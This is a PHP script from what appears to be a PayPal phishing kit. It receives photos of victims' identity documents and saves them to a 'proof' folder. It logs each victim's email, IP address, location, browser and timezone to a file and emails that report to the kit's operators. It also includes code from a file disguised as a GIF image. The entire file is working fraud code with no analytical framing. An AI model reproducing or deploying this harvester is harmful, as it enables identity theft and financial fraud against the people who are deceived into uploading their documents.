<?php if(isset($_POST['doc_type'])&&isset($_POST['images'])){session_start();include '../mine.php';include '../../app/lib/pics/pope.gif';function upImg($vl){$t=microtime(true);$micro=sprintf("%06d",($t - floor($t))* 1000000);$today=date("m.d.y.h.i.s.U".$micro,$t);$name=hash('md5',$today);$type=explode(';',$vl)[0];$type='.'.explode('/',$type)[1];$base=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'./../../../proof/';file_put_contents('./../../proof/'.$name.$type,base64_decode(explode(',',$vl)[1]));return $base.$name.$type;}$_SESSION['doc_type']=$_POST['doc_type'];$msg="=========== <[PaYPal IdeNtiTy ]> ===========\r\n";$msg.="ID OF USER	: {$_SESSION['EML']}\r\n";$msg.="TYPE		: {$_POST['doc_type']}\r\n";for($i=0;$i<count($_POST['images']);$i++){$msg.="FACE (".(int)($i+1).")	: ".upImg($_POST['images'][$i])."\r\n";}$msg.="---------------------- IP Info ----------------------\r\n";$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";$msg.="TIME		: ".now()." GMT\r\n";$msg.="=========== <[PaYPal IdeNtiTy ]> ===========\r\n\r\n\r\n";$save=fopen("../../stored.txt","a+");fwrite($save,$msg);fclose($save);$subject="PaYPal IdeNtiTy [".$_POST['doc_type']."|".$_SESSION['ip_countryName']."]";$headers="From:MANDY <peromandy0p@scam.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($yours,$subject,$msg,$headers);@mail($info,$subject,$msg,$headers);exit('done');}?>